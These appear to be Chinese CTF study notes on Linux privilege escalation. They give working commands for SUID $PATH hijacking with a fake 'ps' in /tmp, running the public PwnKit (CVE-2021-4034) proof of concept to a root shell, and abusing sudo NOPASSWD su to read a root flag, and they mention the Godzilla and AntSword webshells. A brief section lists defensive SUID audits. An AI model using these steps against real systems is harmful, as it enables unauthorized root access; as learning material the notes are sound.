# 参考

- https://blog.csdn.net/Jayjay___/article/details/135097075
- http://www.loveli.com.cn/sub?id=3066

# 提权

## 注意事项

### 没有读写权限

- 可以尝试访问/tmp目录

### tty不完整

完整的tty是很多命令执行的前提，比如sudo，不是完整的tty是不能sudo的。下面是需要完整tty的命令：

```bash
passwd: 修改用户密码时，需要在TTY中输入当前密码和新密码。
su / sudo: 切换用户或以管理员权限执行命令时，通常需要在TTY中输入相应的密码
shutdown / reboot: 关机或重启系统时，可能需要在TTY中输入管理员密码或确认操作。
top / htop: 查看系统进程和资源占用情况，这些命令在TTY中显示实时信息。
vim / nano / emacs: 编辑文本文件时，这些文本编辑器通常在TTY中使用。
apt / yum / dnf: Linux 发行版的包管理器，进行软件包安装、更新或删除时需要在TTY中执行。
ssh: 通过终端远程登录到其他计算机时，需要在TTY中输入密码或进行身份验证。
gnome-terminal / konsole / xterm: 在图形界面下打开终端时，这些终端模拟器在TTY中运行。
```

#### 判断tty是否完整

```bash
>$ tty
tty
not a tty               
以上说明不完整
--------------------------------------
>$ tty
/dev/pts/5
完整
```

#### 修复tty

使用哥斯拉的`superterminal`，在里面运行命令即可。


## linux提取

### suid环境变量提权

#### 原理


原理是利用文件`suid`的权限：谁运行这个程序，程序就“临时变成”文件所有者的身份运行

> SUID（Set User ID）是Linux文件的一个特殊权限位。当一个可执行文件被设置了SUID位：
>
> ```bash
> chmod +s program
> ```
>
> 任何用户运行这个程序时，该进程都会以文件所有者的身份执行，而不是以运行者的身份。如果文件所有者是root，那么**普通用户执行这个程序时，实际上是以root权限在运行**。

$PATH主要用于定义可执行程序的搜索目录。可执行程序包括 Linux系统命令和用户的应用程序。例如：当某个程序 调用 `system("cat /flag")`时 它并不是以 `system("/bin/cat /flag")`;这样来调用cat的 可以被利用。

系统会按照\$PATH环境变量中定义的顺序，从左到右搜索`cat` 如果`$PATH = /tmp:/usr/local/bin:/usr/local/sbin`则会优先搜索 `/tmp`目录是否存在`cat`

> **冒号`:`是分隔符**，目录按**从左到右**的优先级排序。

`$PATH`环境变量劫持的原理：即自己构造一个同名的恶意程序，将要恶意程序所在的路径添加到`PATH`环境变量的前面，使其被优先加载。 而如果我们劫持的这个程序，是一个本身就具有`SUID`权限，以`root`身份执行的程序，那么 劫持成功的话，就是`root`执行我们的恶意程序，写入 `/bin/bash`即可提权



#### ps提权

- 利用find命令查找具有suid权限的文件

  ```bash
  find / -user root -perm -4000 -type f 2>/dev/null
  ```

```bash
(www-data:/var/www/html) $ find / -perm -u=s -type f 2>/dev/null
......
/home/jobs/shell
```


- 运行文件：

  ```shell
  cd /home/jobs
  (www-data:/home/jobs) $ ./shell
     PID TTY          TIME CMD
       1 ?        00:00:00 apache2
     146 ?        00:00:00 shell
     147 ?        00:00:00 sh
     148 ?        00:00:00 ps
  (www-data:/home/jobs) $
  ```

 发现执行了`ps`命令，我们就可以修改ps命令的环境变量


- 修改环境变量
  首先使用蚁剑起一个shell，在shell中执行如下命令：

```bash
cd /tmp
echo "/bin/bash" > ps    #在/tmp目录下创建一个名为ps的文件，内容为/bin/bash
chmod 777 ps
echo $PATH 
export PATH=/tmp:$PATH   # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序
cd /home/jobs
./shell                  #执行ps时，根据环境变量先找到我们写的文件，直接提权
```

上面是通过echo命令进行修改环境变量。


#### cp命令示例

```bash
cd /tmp
cp /bin/bash /tmp/ps
chmod 777 ps
echo $PATH 
export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序
cd /home/jobs
./shell
# 然后就获得了root权限，可以执行命令了
```



#### 防御措施

```bash
# 找出系统中所有SUID文件
find / -perm -4000 -type f 2>/dev/null

# 移除不必要的SUID权限
chmod u-s /path/to/program

# 最小权限原则：不要给需要root权限的程序设置SUID
```



### pkexec提权

#### 0.105

> **CVE-2021-4034**：适用版本，pkexec为0.105
> poc：https://github.com/berdav/CVE-2021-4034

```bash
vagrant@ubuntu-impish:~/CVE-2021-4034$ make
#cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
#cc -Wall    cve-2021-4034.c   -o cve-2021-4034
#echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
#mkdir -p GCONV_PATH=.
#cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034
# whoami
root
# exit
```

### sudo免密提权

```bash
/var/www/html/ >sudo -l

Matching Defaults entries for www-data on 81693c645582:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 81693c645582:
    (ALL) NOPASSWD: /bin/su
    

/var/www/html/ >sudo /bin/su -c 'cat /root/flag.txt' 2>/dev/null

flag{00a112bd70a642ff8790bb0f034ae5b7}

```
